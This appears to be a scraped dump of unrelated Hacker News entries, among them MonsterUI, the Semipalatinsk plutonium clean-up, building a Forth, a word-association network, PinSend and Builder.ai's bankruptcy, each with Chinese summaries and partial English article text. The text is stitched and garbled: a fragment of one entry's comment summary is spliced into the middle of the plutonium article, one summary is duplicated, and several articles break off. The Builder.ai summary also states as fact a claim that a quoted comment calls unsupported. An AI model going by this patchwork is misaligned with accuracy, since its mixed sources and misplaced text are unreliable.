data.title: MonsterUI: Python library for building front end UIs quickly in FastHTML apps
data.author: indigodaddy
data.article_summary:
**总结：**

MonsterUI 旨在简化现代Web应用的UI开发，解决了传统HTML/CSS复杂依赖和样式的管理问题。通过结合FastHTML、Starlette及Tailwind等技术，MonsterUI提供预先设计的美观组件和智能默认设置，开发者无需编写CSS即可创建响应式、互动式的UI。它基于FrankenUI和DaisyUI等现代库，同时允许在需要时完全访问Tailwind CSS。MonsterUI简化了组件布局、图标、头像等元素的控制，使开发者专注于功能而非样式类管理。文章通过构建博客和团队成员卡片的示例展示了其简便性，并强调其在生产环境中的可靠性和可维护性。
data.comments_summary:
主要讨论点：关于使用Python等后端语言直接生成HTML的开发工具和框架的讨论，包括其优缺点、与传统前端开发方法的对比以及具体实现的争议。

不同观点：
• **AsthmaBoy**：认为回到1998/1999年Oracle的开发方式（通过PL/SQL生成HTML）效率低下，修改和维护成本高。他最终通过创建微型CMS解决这些问题，并质疑2025年为何还有人愿意返回这种解决方案。
• **jph00**：FastHTML的创建者，认为FastHTML的功能组件直接映射到HTML标签，对熟悉HTML的人来说没有新的学习成本。他强调这种方法对服务器端渲染的支持以及与传统前端框架（如React、Vue等）的不同，认为各有优劣。
• **johnfn**：对使用Python控制布局和样式的做法表示怀疑，认为这种方法复杂且难以理解，不如Flexbox和Tailwind等CSS工具直观，且文档和AI支持更完善。
• **boxed**：反对将现有的Python生成HTML的方式称为“高层次抽象”，认为这仅仅是HTML的另一种写法，而非更高层次的抽象。
• **mushufasa**：一方面认可这些工具对内部工具或概念验证阶段的帮助，但另一方面指出当需要微调前端时，这类框架往往不够灵活，导致需要重写功能。
• **pacifika**：认为这种多层抽象（如FastHTML、HTMX、Starlette等）增加了调试的复杂性，对实际应用中的调试提出了质疑。
• **acbart**：介绍了自己在教育库Drafter中使用的类似方法，认为这种方法对初学者有效，并能简化部署和单元测试。
• **kissgyorgy**：介绍了自己开发的更通用的Python组件库，可以与其他Python web框架混合使用，并已集成Bootstrap v5组件。
• **danpalmer**：质疑为何不使用模板语言，认为基本HTML加上少量占位符更易于编写和渲染。
• **dcreater**：关注开发模式和资金来源，询问该工具是否开源以及Answer.ai的资金模式。
• **vFunct**：希望有人开发纯Python的声明式HTML组件/CSS/JS框架，类似于SwiftUI，以替代现有的Django模板语言和前端工具。
• **atparinas**：基于Elm的经验，认为这种方法很快会变得糟糕。

补充讨论：
• 不同开发者对使用Python直接生成HTML的工具和框架的接受度和看法不一，有的认为这种方法简化了开发，有的则认为增加了复杂性和学习成本。
• 争议的焦点在于这种方法是否真正提高了开发效率，以及在实际应用中是否足够灵活和易于维护。
• 对“高层次抽象”的定义和实际应用存在不同理解，部分开发者认为这些工具仅仅是HTML的另一种写法，而非更高层次的抽象。
• 对多层抽象的调试复杂性和实际应用中的可行性提出了质疑。

44162814.article_content:
Modern web development requires complicated dependencies and extensive boilerplate spread over multiple languages to make good UI.
MonsterUI
is here to fix that.
The Problem with Web UI Development
Building attractive web applications has always been complicated.
FastHTML
simplifies web app development by bringing HTMX, Starlette, HTML, and HTTP fundamentals together.
Getting the aesthetics right is still too hard. It requires either extensive
CSS
, a framework with long inline class strings, or both. You might try
Bootstrap
or
Tailwind
CSS. Now, you’re managing class names, remembering utility patterns, and checking docs for boilerplate class strings. This leads to code that is hard to build, maintain, and change for anyone who is not an expert designer.
A typical app has many components: nav bars, forms, modals, cards, and more. Each requires careful consideration of styling, responsive behavior, and interactive states. As your application grows, managing these styles consistently becomes more and more challenging.
This became apparent to me while I was developing web apps. I found myself copying and pasting class strings and maintaining complex styling logic across multiple components. FastHTML made the application logic development a joy, but the styling side remained a constant source of friction.
If you’re tired of context-switching between HTML, CSS, and Python just to build basic web UIs,
MonsterUI
might be for you.
Real-World Example: Building a Blog
Introducing MonsterUI
MonsterUI
lets anyone build high-quality, modern web apps in pure Python without sacrificing design quality.
Built with MonsterUI, styled with FrankenUI, based on design by Shadcn
MonsterUI
is a layer on top of FastHTML that provides pre-styled components and smart defaults based on modern libraries (such as Tailwind, FrankenUI, DaisyUI) while maintaining full access to Tailwind CSS when you need it. MonsterUI:
Brings FastHTML’s simplicity to web styling.
Provides beautiful, responsive components without writing a single CSS class.
Lets you focus on building features instead of remembering utility classes.

What MonsterUI does for you
MonsterUI
is based on a simple principle: provide smart defaults while allowing full flexibility.
We’ve done this by builing upon proven approaches from some of the most innovative projects in modern web development, carefully selecting components that address the pain points of raw HTML/CSS while maintaining mature, battle-tested strategies.
MonsterUI’s core is
FrankenUI
, an innovative framework-free UI library by
sveltecult
that uses beautiful HTML-first components. FrankenUI itself was inspired by
shadcn/ui
by
shadcn
which pioneered the concept of copy-pasteable UI components for React.
Raw HTML and CSS present two key challenges: dated visual aesthetics and complex layout management. By combining FrankenUI’s framework-agnostic approach with FastHTML, MonsterUI delivers modern, beautiful components that integrate seamlessly with HTMX’s progressive enhancement paradigm - all while maintaining clean, readable code.

MonsterUI

data.title: Plutonium Mountain: The 17-year mission to guard remains of Soviet nuclear tests (2013)
data.author: jmillikin
data.article_summary: 文章介绍了哈萨克斯坦前苏联塞米巴拉金斯克核试验场遗留的钚威胁及其最终解决过程。在冷战期间，苏联在此进行了456次核试验，其中一些试验留下了可回收的钚残渣，对全球安全构成严重威胁。1991年苏联解体后，这些钚残渣被遗弃，可能被用于制造数十枚核弹。2012年，哈萨克斯坦、美国和俄罗斯的科学家合作，完成了耗时17年、耗资1.5亿美元的行动，通过浇筑混凝土封闭隧道，消除了这一重大核安全隐患。尽管各国政府间存在不信任和保密问题，但科学家们通过非正式合作成功解决了技术问题。然而，由于未正式通知国际原子能机构，一些问题仍未完全解决。
data.comments_summary:
主要讨论点：与苏联解体后遗留的放射性物质相关的风险和事件，包括相关技术设备问题和历史背景。

不同观点：
• **acc_297**：分享了一则关于Raytheon提供的设备因设计不适应哈萨克冬季环境而失效的趣闻，哈萨克自行采购了俄罗斯的设备，价格更低且顺利过冬，暗示美国设备的性价比问题。
• **voidUpdate**：提到苏联解体后遗留在各处的放射性物质带来的危险，引用了两起涉及苏联遗留放射性物质的事故（Lia放射性事件和1997年格鲁吉亚事件），强调历史遗留问题的严重性。
• **epistasis**：通过引用链接讨论了俄罗斯无人机袭击对切尔诺贝利保护罩的破坏，强调了这一行为对环境和安全的威胁，并提供了相关视频作为详细说明。
• **richardatlarge**：提到自己的小说与Semipalatinsk（Polygon）有关，但未深入讨论技术或历史问题，主要是自我宣传。
• **nancyminusone**：质疑为何苏联遗留的钚未被自行回收，并以曼哈顿计划中钚的价值为例，暗示20世纪50年代后钚可能不如过去珍贵。
• **Havoc**：质疑为何有人会冒险进入充满放射性物质的苏联隧道，认为即使是绝望的人也不会愿意承受如此高风险。
• **1oooqooq**：回应nancyminusone的评论，认为如果自己处理放射性物质，也不会通知相关部门，而是自行处理，暗示可能存在隐匿行为。

补充讨论：
• **r721**和**HelloUsername**：提供了相关的延伸阅读链接，但未直接参与讨论，仅为提供信息。
• **Arainach**：指出一个链接无法访问，技术性反馈。
• 争议的焦点在于苏联解体后遗留的放射性物质的管理问题，以及对这些物质处理不当可能带来的风险和历史责任。各方对如何处理这些物质、谁该负责以及潜在的危险有不同的看法。

44168265.article_content:
Introduction
WATCH:
At a recent seminar at the Belfer Center for Science and International Affairs, co-authors Eben Harrell and David E. Hoffman share the inside story of their 'Plutonium Mountain' report
The latest from Belfer
See more
On the desolate steppe of eastern Kazakhstan, the Soviet Union carried out 456 nuclear explosive tests during the Cold War at the Semipalatinsk Test Site, which sprawls over an area approximately the size of Belgium. Of these, the Soviet Union performed 116 tests in the atmosphere, and 340 underground. While some of the nuclear tests at Semipalatinsk involved atomic explosions, other experiments were designed to study the impact of conventional explosives on plutonium and highly enriched uranium (HEU), the fissile materials used in nuclear bombs, or to ensure the safety of nuclear weapons during a simulated accident such as a fire or nearby explosion.
Some of these tests—particularly tests involving plutonium—did not vaporize the material in a nuclear blast. It remained in tunnels and containers, in forms that could be recovered and recycled into a bomb. In addition, the Soviet Union discarded equipment that included high-purity plutonium that would have provided materials and information that could lead to a relatively sophisticated nuclear device if it had been found.
When scientists and military personnel withdrew from Kazakhstan following the collapse of the Soviet Union, they abandoned tunnels and bore holes filled with plutonium residue—enough plutonium, if fully reclaimed, for terrorists or a state to construct dozens of nuclear bombs. Between 1991 and 2012, scavengers looking for valuable metal and equipment from the former Soviet test site came within yards of the unguarded fissile material; in two cases the scavengers broke into the vessels used to contain some of the experiments, although there is no evidence that they removed any plutonium.
In October, 2012, at the foot of a rocky hillside, at a spot known as Degelen Mountain, several dozen Kazakh, Russian, and American nuclear scientists and engineers gathered for a small ceremony that marked the completion of a 17-year, $150 million operation to secure the plutonium in the tunnels of Degelen Mountain and in surrounding bore holes by filling portions of the tunnels and holes with a special concrete, greatly reducing one of the largest nuclear security threats since the collapse of the Soviet Union. They unveiled a three-sided stone monument, etched in English, Russian, and Kazakh, which declared: “1996-2012. The world has become safer."
The story of the operation at Semipalatinsk is a tale of scientists working together to achieve real results in reducing nuclear threats. It began in 1995, after the collapse of the Soviet Union, when experts from the Los Alamos National Laboratory were told during a visit to Kazakhstan that plutonium residue in recoverable form was likely to have been abandoned at the test site. Two years later, in 1997, Siegfried S. Hecker, just retiring as director of Los Alamos, decided to look more closely. Hecker, who helped pioneer cooperation with his counterparts in the Soviet and later Russian nuclear weapons laboratories, used personal connections to push for action. He succeeded in enlisting the cooperation of Russian nuclear scientists who had been involved in the testing program in Kazakhstan before the Soviet collapse.
Scientists and engineers from the United States, Russia, and Kazakhstan overcame deep-rooted suspicions in their governments to find technical solutions to the plutonium threat at Degelen Mountain. The operation was based almost entirely on ad-hoc agreements struck at a lower level, and was carried to a conclusion without elaborate, negotiated state-to-state agreements of the kind used for arms control during the Cold War. Each country played a crucial role.
The operation took 17 years to complete, a period in history that saw the rise of al-Qaeda and its nuclear ambitions, the 9/11 attacks, and spanned three different U.S. administrations, the latter two of which proclaimed nuclear terrorism the greatest threat to U.S. security and spent billions of dollars to prevent it. Serious logistical difficulties were just one reason the Semipalatinsk operation took so long. Another was lingering mistrust, inertia and excessive secrecy. Until prodded by the scientists, the governments had done very little about the plutonium abandoned at the test site.
The informal approach was effective, but slow, and it left some issues unresolved or partly unexplored. For example, although Kazakhstan signed the 1968 Nuclear Non-proliferation Treaty in 1993 and had a legal obligation to declare all the fissile material on its territory, the three countries overseeing the operation decided not to formally notify or involve the International Atomic Energy Agency. • **1oooqooq**：回应nancyminusone的评论，认为如果自己处理放射性物质，也不会通知相关部门，而是自行处理，暗示可能存在隐匿行为。

补充讨论：
• **r721**和**HelloUsername**：提供了相关的延伸阅读链接，但未直接参与讨论，仅为提供信息。
• **Arainach**：指出一个链接无法访问，技术性反馈。
• 争议的焦点在于苏联解体后遗留的放射性物质的管理问题，以及对这些物质处理不当可能带来的风险和历史责任。各方对如何处理这些物质、谁该负责以及潜在的危险有不同的看法。

data.title: Implementing a Forth
data.author: todsacerdoti
data.article_summary: 文章主要介绍了作者在学习和制作Forth编程语言过程中的经验和心得。Forth是一种简洁且基于堆栈的编程语言，作者通过几次实践，包括移植现有的Forth（如JONESFORTH）和制作极小核心的Forth，深入了解了Forth的实现和计算机工作原理。文章提出了三点建议：1. 考虑移植现有的Forth以学习语言实现；2. 制作一个极小核心的Forth，探索其最小功能集；3. 参考一些极小Forth实现，如PlanckForth、SmithForth、sectorforth、milliForth和StoneKnifeForth。作者强调，制作Forth的过程不仅能加深对语言的理解，还能带来编程的乐趣和成就感。
data.comments_summary:
主要讨论点：Forth语言的实际应用、实现及学习价值

不同观点：
• **Forth的实际应用价值有限**：[blippage]认为Forth虽然有趣且适合用来构建领域特定语言（DSL），但在实际应用中，其他语言通常更实用。他提到Forth容易让人迷失，尤其在构建复杂系统时。

• **Forth的长期实用性与专业应用**：[spelc]从自身经验出发，表示自1981年以来一直依靠Forth谋生。他指出Forth虽然不再流行，但依然可以用来编写大型应用，比如一个包含140万行Forth代码的项目。他还提到，Forth的微妙之处需要通过实际应用来体会，而不是仅仅通过编写新的Forth内核。

• **Forth在公司环境中的局限性**：[timonoko]认为Forth和Lisp等语言允许用户随意改进语言本身，这可能导致在公司环境中难以维护和标准化，尤其是在不具备高技术水平的人员中推广时。

• **Forth作为学习工具**：[whobre]和[jshprentz]提到Forth更多是被用来实现而不是实际应用，暗示学习Forth的主要价值可能在于理解语言的内部机制和编译原理。[jshprentz]分享了自己45年前尝试实现Forth的经历，强调了Forth在早期计算机上的小巧和灵活性。

• **Forth在现代开发中的创新应用**：[acidx]和[s-macke]展示了Forth在现代项目中的应用潜力，比如用于驱动LED矩阵和构建Web UI，以及在Go等高级语言中实现Forth编译器。[acidx]还提到了对Forth的优化和代码生成方面的探索。

• **Forth作为语言设计的学习工具**：[codr7]认为Forth及其衍生语言是学习设计新语言的好起点，他正在开发一个降低新手语言设计门槛的项目。[vermilingua]则质疑是否可以在高级语言中实现Forth作为学习手段，回应者如[firesteelrain]建议使用《Crafting Interpreters》一书作为指导。

补充讨论：
• **Forth资源推荐**：[john-tells-all]推荐了《Threaded Interpretive Languages》一书，认为它清晰描述了Forth的内部机制。[peter_d_sherman]也提到了一些优秀的Forth相关文章和学习资源。

• **争议焦点**：Forth的主要争议在于其实际应用价值与学习工具之间的平衡。一方面，Forth被认为在实际项目中不如其他语言实用；另一方面，它的简单性和灵活性使其成为学习语言设计和编译原理的优秀工具。

44142652.article_content:
Back to my Forth pages.
(Image of "Four-Armed Chuck" programming a PDP-11 is from my
giant write-up of Forth
.)
I’ve made a couple Forths. Not a single one of them are "finished software"
intended for industrial use, but
all
of them taught me something about Forth,
concatenative programming, and how computers work in general.
Sure, I’ve done my time in that place where points are free and the stacks
always need twiddling. But what about you?
You’re thinking about making a Forth yourself, aren’t you? Of course you are.
The call is irresistable. I know that.
The only thing holding you back is uncertaintly.
You’re thinking, where do I start? How much Forth should I make? How do I know
when I’m done?
(Here, all of it, and you don’t.)
But here are three things to consider.
1. Consider porting an existing Forth
The first Forth I made was a port of JONESFORTH by Richard WM Jones. I found
it through…​
http://lambda-the-ultimate.org/node/2452
…​which lead me to…​
https://rwmj.wordpress.com/2010/08/07/jonesforth-git-repository/
The output of my
nightly meditation
was
NasmJF
, a port of JonesForth to the NASM assembler.
The beauty of many Forths is that they contain a core Forth written in a host
language (or machine code) and then the rest of the language features are
implemented in…​Forth!
Knowing when I had completed my port was easy - I was done when
my ported assembly half of JonesForth could run the Forth half
of JonesForth.
Here’s the Forth half of JonesForth:
jonesforth.f
I think porting software is a pretty amazing way to learn
about a program and especially a language implementation. Here’s a card:
Porting Software
.
(At the moment, it’s somewhat redundant with the page you’re reading, but it
will probably get a lot more interesting when I do my next port, whatever that
ends up being. Hint: probably a Sed.)
2. Consider making an ultra-tiny Forth core
I think one of the most interesting questions in the Forth universe is
how small can its core be?
Which is to say, how few words do you need to
implement in a host language (or raw machine code, as we’ll see) before you can bootstrap
the rest of the language in the Forth itself?
Sadly (ha!), you can make a computer with just
one
instruction:
One-instruction set computer
(wikipedia.org).
(The most popular one I’ve seen is SUBLEQ, which stands for "SUBtract, branch
if Less than/EQual to zero". And since there’s only one, you typically omit it
and your program is just the operands for the implied instruction. The
"language", then, has
no
operations and feels to me like the computing
equivalent of John Cage’s musical stunt
4'33"
(wikipedia.org).)
So I guess a Forth with
one
word is all you need.
Therefore, it’s not a question of, "How few words would be
possible
?" but
rather, "How few words would be
interesting
?"
The answer will be personal to you.
The Forth-eV Wiki’s page on
"Minimal Word Set"
is a great place to start:
https://wiki.forth-ev.de/doku.php/en:words:kernel_embedded:minimum_word_set
In addition to the word set, you can also constrain the total file weight of your
core Forth. (Or lines of source or some other arbitary limitation.)
Some really intriguing minimal Forths I’ve encountered:
PlanckForth
https://github.com/nineties/planckforth
I love the hexdump visualization of Koichi Nakamura’s PlanckForth:
You’re looking at a complete working Forth implementation in the form of a
hand-written ELF binary in less than 1,000 bytes. The rest of PlanckForth is
written in PlanckForth to implement a "normal" Forth.
SmithForth
https://dacvs.neocities.org/SF/
David Smith’s SmithForth is another 1,000 byte, hand-written machine code Forth
that bootstraps a more complete Forth.
"My goal with SmithForth is not to stop writing machine code early, but to
start writing Forth early."
I love tiny Forths!
sectorforth
https://github.com/cesarblum/sectorforth/
Cesar Blum’s sectorforth is even smaller, at 512 bytes (the size of a boot sector).
Like other ultra-tiny Forths, it starts with just a handful of Forth primitives
with which to bootstrap higher-level constructs.
The included
01-helloworld.f
example is 200 lines of well-commented Forth
source which starts with making numbers, implements a core of standard
Forth words, and then prints "Hello world".
I imagine this is how Ents talk.
"As soon as the whole company was assembled, standing in a wide
circle round Treebeard, a curious and unintelligible conversation
began."
--JRR Tolkein, The Two Towers
milliForth
https://github.com/fuzzballcat/milliForth
512 bytes too much for you? How about 336? By my count, fuzzballcat’s
milliFORTH implements 11 words and it can do anything, just, you know,
painfully
. The "Hello World" is 53 lines of pain.
StoneKnifeForth
https://github.com/kragen/stoneknifeforth
Not just a hand-written Forth binary, but
also
a metacircular compiler,
Kragen Javier Sitaker’s StoneKnifeForth source comes to a total of 1,902
essential bytes.

data.title: Show HN: Controlling 3D models with voice and hand gestures
data.author: getToTheChopin
data.article_summary: "3D Model Playground" 是一个开源的网页应用，允许用户通过手势和语音命令实时控制3D模型。该项目使用 Three.js 进行3D渲染，MediaPipe 进行手势追踪，Web Speech API 实现语音识别，并结合 HTML5 Canvas 提供视觉反馈。用户可以通过说 "drag"（拖动）、"rotate"（旋转）、"scale"（缩放）或 "animate"（动画）来改变交互模式，并通过手指捏合来控制3D模型。此外，用户还可以拖放新的3D模型（目前仅支持GLTF格式）到页面进行导入。该项目提供了一个实时交互的演示，并包含详细的开发设置说明。技术栈包括 Three.js、MediaPipe、Web Speech API 和 JavaScript 等。
data.comments_summary:
主要讨论点：LeapMotion技术及其应用

不同观点：
• [chimpansteve] 提到LeapMotion技术的过往和当前支持情况，表示在清理物品时偶然发现了该设备，引发对该技术现状的讨论。
• [corysama] 关注使用LeapMotion时的人体工学问题，指出如果用户在使用时需要一直举起手，可能会很快感到疲劳，建议系统应支持 hands-in-lap 的操作方式。
• [getToTheChopin] 提供了一个视频演示链接，展示LeapMotion的实际操作效果，便于其他讨论者更直观地理解该技术。
• [ugh123] 对技术表示赞赏，并提出功能建议，如使用特定的手势来触发旋转和缩放功能，以增强用户体验。
• [doakes] 对LeapMotion及其类似产品表示兴趣，分享了一个相关视频链接以供参考，展现出对该技术空间的长期关注。
• [danvoell] 认为该技术非常酷，并指出其在物理游戏中的潜力，强调其在娱乐领域的应用价值。
• [xnx] 对屏幕上的操作说明感到困惑，建议增加图像或动画以帮助用户更好地理解控制方式，关注用户界面的友好性。
• [ednite] 对LeapMotion技术的实用性表示肯定，尤其看好其在互动内容创作和产品展示方面的应用，并表示愿意进一步测试。

补充讨论：
• 讨论中涉及了LeapMotion技术的实际操作体验、人体工学问题、用户界面说明的清晰度以及该技术在不同领域（如游戏、产品展示）的潜在应用。

• 讨论者普遍对LeapMotion技术表示兴趣，并提出了功能改进和用户体验优化的具体建议。

data.title: The Small World of English
data.author: michaeld123
data.article_summary: 文章介绍了构建一个包含150万个英语词汇的语义网络的过程，该网络用于单词关联游戏。通过结合人工编辑的词库、书籍分类系统和受限的语言模型查询，研究团队解决了如何从40多个关联中筛选出17个可玩的选项的问题。结果显示，76%的随机词汇对可以在≤7步内连接，平均路径长度为6.43步。该网络展示了类似社交网络的“小世界”现象，允许玩家通过有意义的关联逐步导航，例如从“crown”到“inspect”的链条。传统的词库资源缺乏关联丰富性，而该项目通过扩大涵盖范围，包括俚语、技术术语和复合短语，构建了一个更全面的语义网络。这一成果在词汇关联研究中具有重要意义，并为单词游戏提供了理想的谜题参数。

« HOME
Making the Game
Mapping Language
Other Semantic Games
The Small World of English
Building a word game forced us to solve a measurement problem: how do you rank 40+ ways to associate any given word down to exactly 17 playable choices? We discovered that combining human-curated thesauri, book cataloging systems, and carefully constrained LLM queries creates a navigable network where 76% of random word pairs connect in ≤7 hops—but only when you deprecate superconnectors and balance multiple ranking signals. The resulting network of 1.5 million English terms reveals that nearly any two common words connect in 6-7 hops through chains of meaningful associations. The mean path length of 6.43 hops held true across a million random word pairs—shorter than we’d guessed, and remarkably stable.

This is consistent with the small-world structure and near-universal connectivity seen in lexical network research on smaller datasets.
1,2
The network's structure makes intuitive semantic navigation possible—players can
feel their way
through meaningful transitions: a crown's gemstones lead to emerald's foliage and finally to a forest canopy, or a flame becomes an ember, then a glowing memory, a mental recall, and finally the action to cancel.

The Mathematics of Semantic Distance
English exhibits network effects remarkably similar to social networks—nearly any random pair of words can reach each other in just a few hops through chains of meaningful associations. This “small world” phenomenon was first measured in word co-occurrence networks,
3
and persists even after we deprioritize superconnector words that might otherwise dominate many paths.
To probe this, we randomly sampled 1 million word pairs (4 days processing on 32 cores), to get a strong statistical sampling of the connected core of English.

Network Construction and Coverage
When we started this project, we tried the obvious approach: combining existing resources like WordNet with early-generation AI tools including LDA topic modeling and static word vectors. WordNet gave us clean synonym sets but lacked the associative richness players expect (“coffee” → “morning” not just “beverage”). LDA found topical clusters but mixed unrelated terms that happened to co-occur. Word vectors collapsed all senses into single points, making “bank” (river) indistinguishable from “bank” (financial). These produced fragmented, overly generic relationships that lacked the nuance our game needed.
We capture 40 associations per term (enough for algorithmic flexibility) and display 17 in our interfaces (what users can reasonably process). This depth provides flexibility for both puzzle generation and reference use.
1,525,522 headwords
We built a semantic network of 1.5 million English terms by casting a wider net than traditional resources. Where academic dictionaries drew sharp boundaries—excluding slang, technical jargon, compound phrases, and proper nouns—we included what people actually say and write. From “ice cream” to “thermodispersion,” from “ghosting” to “Khao-I-Dang.”
This scale would have cost tens of millions to achieve manually. Consider the monumental pre-LLM efforts:
WordNet (1985-2010)
- Princeton’s 25-year project produced 155,000 words in synonym groups. Became the NLP standard despite missing everyday compounds.
OED
(1857-1928, ongoing)
- The definitive historical dictionary with 500,000+ entries. Took 70 years and thousands of contributors.
Webster’s Third
(1961)
- America’s unabridged dictionary with 476,000 entries. Required 757 editor-years and $3.5 million ($50M+ today).
Roget’s Thesaurus (1852)
- The original meaning-based reference with 15,000 words in 1,000 conceptual categories.
Word counts become arbitrary at this scale. Include every technical term, place name, and slang variant, and the count explodes. Whether we have 1.5 million or 2 million depends entirely on where you draw the line.
Atlas of Connected Meaning
Our inclusion criteria cast a wide net: all terms that volunteer lexicographers at Wiktionary have
included
(slightly more liberal than typical unabridged dictionaries), plus high-importance Wikipedia topics that are 1-3 words long (measured by PageRank), plus frequently produced compound terms generated by LLMs
44170968.article_summary: 文章介绍了构建一个包含150万个英语词汇的语义网络的过程，该网络用于单词关联游戏。通过结合人工编辑的词库、书籍分类系统和受限的语言模型查询，研究团队解决了如何从40多个关联中筛选出17个可玩的选项的问题。结果显示，76%的随机词汇对可以在≤7步内连接，平均路径长度为6.43步。该网络展示了类似社交网络的“小世界”现象，允许玩家通过有意义的关联逐步导航，例如从“crown”到“inspect”的链条。传统的词库资源缺乏关联丰富性，而该项目通过扩大涵盖范围，包括俚语、技术术语和复合短语，构建了一个更全面的语义网络。这一成果在词汇关联研究中具有重要意义，并为单词游戏提供了理想的谜题参数。

data.title: Show HN: PinSend – Share text between devices using a PIN(P2P, no login)
data.author: avovsya
data.article_summary: PinSend是一款用于在设备间即时、安全分享文本和图片的工具。用户可以通过创建新会话或输入PIN加入现有会话，开始分享内容。分享过程通过端到端加密确保安全，且数据不存储在服务器上。用户只需在浏览器中操作，无需注册账户。分享时，会生成PIN、链接或QR码，其他设备可以快速加入并实时同步内容。用户还可以随时离开会话或终止整个会话。
data.comments_summary:
主要讨论点：基于WebRTC和P2P技术的文本和文件共享工具的实现、安全性、用户体验及技术细节。

不同观点：
• [nafey] 认为WebRTC的P2P连接必须通过中心化的服务器交换地址，质疑该工具如何在没有服务器中继的情况下实现P2P连接。
• [AnonC] 关注工具的端到端加密和P2P性质，质疑源代码是否开放及自托管的可能性，并询问业务模式及图片传输功能。对当前功能表示怀疑，并提到类似服务如Firefox Send。
• [syx] 强调用户体验的改进，如URL的易用性和PIN的安全性，建议增加QR码功能，并强调端到端加密的重要性。
• [ebfe1] 自荐其开发的文件共享工具，强调浏览器端加密及安全性，并对WebRTC技术表示赞赏。
• [gruez] 质疑文本共享需要网站及PIN的必要性，建议直接使用QR码传输文本。
• [cloudking] 提出Signal应用作为类似解决方案，强调其端到端加密及跨设备使用功能。
• [mgkimsal] 赞赏该工具的实现，并分享自己使用其他工具的经验，同时关注安全性问题，建议增加会话批准功能。
• [fladd] 对工具的实际操作感到困惑，描述了跨设备连接时遇到的问题，质疑会话管理的有效性。
• [globalnode] 对WebRTC技术表示兴趣，但希望有更易懂的学习资源。
• [markvdb] 提供了一些用户界面和功能设计上的建议，如简化URL和避免对用户需求的假设。
• [doomrobo] 关注PIN码的安全性，提到Magic Wormhole使用的PAKE协议，以避免暴力破解攻击。
• [Imustaskforhelp] 提供了大量建议，包括使用类似piping server和wormhole协议的技术，并讨论了隐私保护和托管问题，最后表达了对该工具的赞赏。
• [lxgr] 质疑六位字母数字代码如何实现WebRTC连接的初始设置，认为可能需要服务器参与。
• [giantg2] 担心六位代码的安全性，认为需要增加会话过期和连接批准功能以提高安全性。
• [fabrice_d] 关注初始ICE连接的协商过程，质疑在没有中继服务器的情况下如何实现。

补充讨论：
• 工具的安全性和加密方式是讨论的核心，尤其是端到端加密和PIN码的安全性。
• 用户体验和功能设计也是重要关注点，包括URL的易用性、QR码功能和跨设备连接的便捷性。
• 技术实现细节如WebRTC的初始连接设置和ICE协商过程引起了技术背景用户的兴趣和讨论。
• 业务模式和自托管可能性也是部分用户关心的问题，反映了用户对服务可持续性和隐私保护的关注。

data.title: Builder.ai Collapses: $1.5B 'AI' Startup Exposed as 'Indians'?
data.author: healsdata
data.article_summary: Builder.ai，一家曾获微软支持、估值15亿美元的AI创业公司，现因主要贷方扣押3700万美元而陷入运营瘫痪，已申请破产保护。这家无代码平台公司此前宣称利用AI帮助企业轻松构建应用，但实际上依靠700名印度开发人员手动编写代码，伪装成AI服务。公司CEO更换、财务造假曝光以及投资者信心的崩溃，最终导致其在英国、美国、阿联酋、新加坡和印度等地申请破产。此事件揭示了AI行业过度炒作、财务监管不力等问题，引发对AI公司透明度和营销伦理的广泛关注。
data.comments_summary:
主要讨论点：Builder.ai的财务问题及其商业模式的真实性

不同观点：
• paxys认为Builder.ai存在传统的会计欺诈问题，包括下调核心销售数据和请审计员检查过去两年的财务状况。前员工指出公司在投资者简报中夸大了销售业绩。
• rafram提供了更权威的新闻来源，指出相关报道已有时日，此事并非新消息。
• bartread补充说明金融时报（FT）早在约9天前就报道了Builder.ai的崩溃，并提供了相关链接。
• ricardobeat质疑公司所花费的4.5亿美元的去向，认为700名印度开发者在八年内开发成本应远低于此数额。
• dang区分了两种指控：无聊的指控是公司通过循环交易夸大销售，这与最近的报道一致；耸人听闻的指控是公司的AI产品实际上是“印度人假装是机器人”，但此指控缺乏证据支持。
• fazkan认为开发一个应用程序构建器并不困难，并以自己团队在两周内完成类似项目为例，质疑Builder.ai如何获得如此巨额投资。
• ManBeardPc表示在2019年对Builder.ai进行尽职调查时，很快就发现其存在问题，但公司仍能筹集到超过5亿美元的资金。
• Ancalagon认为在当前AI技术如此发达的情况下，出现这样的情况非常奇怪。
• perryh2提到类似的案例，如EvenUp，也涉及AI错误和幻觉问题。
• LeicaLatte幽默地指出这可能是“做不 scale 的事情”的一个极端例子。
• tartoran关心公司从投资者那里筹集到的资金的去向，是否被浪费或私吞。
• Havoc指出公司可能一直以混合模式为目标，而非纯AI，但目前因舆论焦点在“印度人假装是机器人”上，难以判断。

补充讨论：
• 评论中多次提到Builder.ai的商业模式和其AI产品的真实性问题。
• 争议焦点在于公司是否通过不正当手段夸大销售业绩，以及其AI技术的真实性。
• 部分评论提供了相关新闻链接和案例，帮助更好地理解事件背景。
• 对公司巨额资金去向的质疑也是讨论的重点之一。

44169759.article_content:
Technology
Builder.ai, the $1.5 billion 'AI' startup once touted with Microsoft backing, is now seeking bankruptcy protection. A major lender's $37 million seizure paralysed operations.
X /   Harsh Dwivedi | Building Medial @harsh_dwivedi7
The tech world is reeling from revelations that Builder.ai, once hailed as a $1.5 billion (£1.11 billion), 'AI' powerhouse, now faces scrutiny as its highly promoted artificial intelligence facade crumbles, revealing a human-powered operation behind the cutting-edge AI automation.
Builder.ai, the British no-code AI startup that once garnered acclaim for its strategic partnership with
Microsoft
and secured a $250 million (£184.64 million) investment led by the Qatar Investment Authority,
declared
Tuesday that it is initiating bankruptcy protection.
As reported by
Bloomberg
, the company's dramatic decline occurred after a key lender, Viola Credit, withdrew $37 million (£27.33 million) from its accounts, leaving a mere $5 million (£3.69 million) in restricted funds and effectively paralysing operations in five nations.
Earlier this year, CEO Manpreet Ratia took over from founder Sachin Dev Duggal in a boardroom shake-up designed to restore investor confidence. Ratia has since stated that most of the company's workforce has been laid off. As Bloomberg reports, Builder.ai will now commence bankruptcy filings in its operational territories, including the UK, US, UAE, Singapore, and India.
Builder.ai's $450 Million Funding: Big Names, Big Promises
Launched in 2016, Builder.ai presented itself as a groundbreaking platform, allowing businesses to create customised applications with minimal coding, leveraging
artificial intelligence
. As reported by Bloomberg, the company accumulated over $450 million (£332.36 million) in total funding, drawing in prominent investors such as
Microsoft
, the World Bank's IFC, Jeffrey Katzenberg's WndrCo, Lakestar, and SoftBank's DeepCore incubator.
Less than two months ago, Builder.ai admitted to revising down core sales numbers and engaging auditors to inspect its financials for the past two years. This came amidst concerns from former employees who suggested sales performance had been inflated during prior investor briefings.
'Bots' Revealed As Builders From India
